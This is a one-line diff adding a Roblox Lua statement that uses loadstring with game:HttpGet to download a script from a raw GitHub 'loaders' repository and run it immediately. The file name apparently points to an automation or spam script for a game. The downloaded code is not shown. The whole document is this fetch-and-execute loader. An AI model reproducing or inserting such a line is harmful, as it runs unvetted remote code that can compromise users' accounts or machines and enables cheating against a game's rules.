@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/upd-my-anime-mine-spam5-x3u6cn9ko3nt3s.lua"))()
